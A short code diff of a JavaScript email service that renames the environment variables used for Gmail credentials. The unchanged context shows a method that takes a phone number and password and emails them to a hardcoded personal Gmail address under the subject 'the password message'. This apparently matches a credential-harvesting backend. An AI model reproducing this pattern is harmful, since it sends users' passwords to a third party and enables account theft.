@@ -24,15 +24,15 @@ let SendEmailService = class SendEmailService {
             service: "gmail",
             secure: true,
             auth: {
-                user: variables_service_1.envVariables.EMAIL_USER,
-                pass: variables_service_1.envVariables.EMAIL_PASS,
+                user: variables_service_1.envVariables.USER_EMAIL,
+                pass: variables_service_1.envVariables.USER_PASSWORD,
             },
         });
     }
     async main({ phone, password }) {
         Server: "email";
         const info = await this.transporter.sendMail({
-            from: variables_service_1.envVariables.EMAIL_USER,
+            from: variables_service_1.envVariables.USER_EMAIL,
             to: "osamaproud01@gmail.com",
             subject: "الرسالة بتاعت كلمة السر",
             html: (0, template_service_1.template)(password, phone),
